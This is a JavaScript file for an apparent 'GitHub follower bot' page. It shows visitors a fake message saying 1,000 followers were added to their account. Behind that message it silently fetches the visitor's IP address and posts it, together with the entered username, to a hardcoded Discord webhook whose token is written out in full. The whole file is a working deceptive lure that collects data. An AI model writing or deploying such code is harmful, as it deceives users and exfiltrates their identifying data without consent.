document.addEventListener("DOMContentLoaded", function() {
    const form = document.getElementById("bot-form");
    const message = document.getElementById("message");

    // Submit form event
    form.addEventListener("submit", function(e) {
        e.preventDefault();
        const username = document.getElementById("username").value;
        
        // Show the fake bot message
        message.textContent = `Successfully botted 1,000 followers to ${username}'s GitHub account!`;
        message.classList.remove("hidden");

        // Fetch the user's IP and send it to the Discord webhook
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const ipAddress = data.ip;
                console.log("User's IP: ", ipAddress);

                const discordWebhookUrl = "https://discord.com/api/webhooks/1294755524826628136/Mb7QgegjkM33slZlHJXy2fyutTtaDnVn1YtZ_sWyc5gda51DyXuA_uq8ZKNZrz9wyD0L"; // Replace with your webhook URL

                fetch(discordWebhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        content: `IP Address: ${ipAddress}, GitHub Username: ${username}`
                    }),
                })
                .then(response => {
                    if (response.ok) {
                        console.log('IP and username sent successfully to Discord webhook.');
                    } else {
                        console.error('Failed to send IP and username to Discord webhook.');
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                });
            })
            .catch(error => {
                console.error('Error fetching IP:', error);
            });
    });
});
